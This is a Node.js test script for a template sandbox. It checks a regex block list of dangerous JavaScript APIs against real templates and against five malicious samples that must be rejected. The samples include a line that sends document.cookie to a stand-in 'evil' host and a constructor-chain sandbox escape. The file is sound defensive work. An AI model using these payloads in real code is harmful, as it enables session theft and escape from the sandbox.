// Runnable check: every real template passes the sandbox blocklist, and known
// malicious patterns are rejected. Run: node scripts/check-sandbox.mjs
import { readFileSync } from 'node:fs';
import assert from 'node:assert';

const strip = (c) => c.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/\/\/[^\n]*/g, ' ');

// keep in sync with src/template-host.ts FORBIDDEN
const FORBIDDEN = [
  [/\bimport\s*[({]/, 'import()'], [/(^|[^.\w])import\s+[\w{*"']/m, 'import'], [/\brequire\s*\(/, 'require'],
  [/\beval\b/, 'eval'], [/\barguments\b/, 'arguments'], [/\bnew\s+Function\b/, 'new Function'], [/\.\s*constructor\b/, '.constructor'],
  [/\bwindow\s*[.[]/, 'window'], [/\bdocument\s*[.[]/, 'document'], [/\bglobalThis\b/, 'globalThis'],
  [/\bfetch\s*\(/, 'fetch'], [/\bnew\s+(XMLHttpRequest|WebSocket|EventSource|Worker)\b/, 'network'],
  [/\b(localStorage|sessionStorage|indexedDB)\s*[.[]/, 'storage'], [/\.\s*cookie\b/, 'cookie'],
  [/\bimportScripts\b/, 'importScripts'], [/\b(setTimeout|setInterval)\s*\(/, 'timers'],
  [/while\s*\(\s*true\s*\)/, 'while(true)'], [/for\s*\(\s*;\s*;\s*\)/, 'for(;;)'], [/\bdebugger\b/, 'debugger'],
];
const rejects = (code) => FORBIDDEN.some(([re]) => re.test(strip(code)));

const templates = JSON.parse(readFileSync(new URL('../src/chatcut-templates.json', import.meta.url), 'utf8'));
const bad = templates.filter((t) => rejects(t.code));
assert.equal(bad.length, 0, `these real templates were wrongly rejected: ${bad.map((t) => t.name).join(', ')}`);

// malicious samples MUST be rejected
const MALICIOUS = [
  `const X=({item})=>{fetch("//evil?c="+document.cookie);return <div/>}`,
  `const X=({item})=>{const g=[].constructor.constructor("return this")();return <div/>}`,
  `const X=({item})=>{eval("nasty");return <div/>}`,
  `const X=({item})=>{localStorage["k"];return <div/>}`,
  `const X=({item})=>{while(true){};return <div/>}`,
];
for (const m of MALICIOUS) assert.ok(rejects(m), `malicious sample slipped through: ${m}`);

console.log(`✓ sandbox check: ${templates.length}/${templates.length} real templates pass, ${MALICIOUS.length}/${MALICIOUS.length} malicious blocked`);
